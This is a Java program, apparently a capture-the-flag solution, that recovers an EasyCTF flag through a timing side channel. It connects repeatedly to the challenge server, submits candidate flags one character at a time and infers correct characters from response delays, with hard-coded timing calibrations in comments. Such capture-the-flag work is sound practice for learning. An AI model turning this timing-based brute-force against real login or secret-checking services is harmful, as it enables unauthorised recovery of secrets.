package ru.serega6531.ctf;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;

public class Main {

    public static void main(String[] args) throws IOException {
        Socket socket;
        InetSocketAddress addr = new InetSocketAddress("c1.easyctf.com", 12482);

        StringBuilder line = new StringBuilder(20);

        String guessedKey = "";
        char currentChar = 126;
        boolean repeat = false;

        while (true) {
            if(currentChar == 32) {
                System.out.println("Couldn't guess character");
                return;
            }

            socket = new Socket();
            socket.connect(addr);

            InputStream sin = socket.getInputStream();
            OutputStream sout = socket.getOutputStream();

            DataInputStream in = new DataInputStream(sin);
            DataOutputStream out = new DataOutputStream(sout);

            char c = ' ';
            while (c != '\uFFFF' && c != ':') {
                c = (char) in.read();
                line.append(c);
            }
            System.out.println(line);
            line.delete(0, line.length());

            String key = "easyctf{" + guessedKey + currentChar + '}';
            System.out.println(key);

            out.writeBytes(key + "\n");
            out.flush();

            long startTime = System.currentTimeMillis();

            while (c != '\n') {
                c = (char) in.read();
                line.append(c);
            }

            System.out.println(line);

            long diff = System.currentTimeMillis() - startTime;
            double threshold = 4170 + 290 * (6 + guessedKey.length());

            System.out.println("diff = " + diff + ", thsh = " + threshold);
            //0 = 135
            //1 = 1560
            //2 = 2870
            //3 = 4170
            //4 = 4467
            //5 = 4758
            //6 = 5058
            //7 = 5385
            //8 = 5680

            socket.close();

            if(diff > threshold) {
                if(!repeat) {
                    repeat = true;
                } else {
                    guessedKey += currentChar;
                    currentChar = 126;
                    repeat = false;
                }
            } else {
                currentChar--;
                repeat = false;
            }

            if(!line.toString().contains("no")) {
                return;
            }

            line.delete(0, line.length());
        }
    }
}
